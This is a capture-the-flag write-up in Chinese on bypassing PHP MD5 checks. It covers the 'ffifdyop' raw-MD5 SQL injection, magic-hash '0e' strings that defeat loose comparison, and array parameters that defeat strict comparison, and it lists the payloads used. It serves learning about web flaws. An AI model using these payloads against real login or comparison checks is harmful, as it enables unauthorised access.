上存數據 -> burosuite抓包分析 ->

```https
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 01 Jul 2023 03:59:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.3.22
hint: select * from 'admin' where password=md5($pass,true)
Content-Length: 3107
```

有hint ->`select * from 'admin' where password` -> `password=ffifdyop` -> `ffifdyop`在md5後會是`'or'6<乱码>`

變成 -> `select * from 'admin' where password= 'or'6<乱码>` -> 恆等TRUE

->到了level91.php -> 抓包分析

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    header('Location: levell14.php');
-->

```

要a不等於b，但在md5後要是同一樣 （弱类型比较(==)）

payload:`?a=QNKCDZO&b=240610708` -> 使用0e绕过

```
md5-0e绕过
------
    QNKCDZO
    240610708
    byGcY
    sonZ7y
    aabg7XSs
    aabC9RqS
    s878926199a
    s155964671a
    s214587387a
    s1091221200a
------
這些數值在md5後都是0e開頭，而0e會被转换为0
0==0 //TRUE
```

得到新的php 
```php
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
?>
```
這個在`param1`要和`param2`不同但md5後要一樣  (强类型比较(===),判断内容的基础上,还会判断类型是否相同)

-> 數組绕过 -> md5 不能用於數組

```
payload:
----------
param1[]=1
param2[]=2
----------
NULL=NULL //TRUE
```
由於是POST請求 -> 上傳`param1[]=1&param2[]=2` -> 拿到flag

|知識點||
|----|-----|
|md5|MD5訊息摘要演算法，一種被廣泛使用的密碼雜湊函式，可以產生出一個128位元的雜湊值，用於確保資訊傳輸完整一致。|
|弱类型比较(==)|只判断内容是否相等,如果是字符串类型,则转换成数值型后进行判断|
|强类型比较(===)|判断内容的基础上,还会判断类型是否相同|
|MD5绕过|0e绕过,數組绕过,Md5碰撞,MD5-SQL注入|
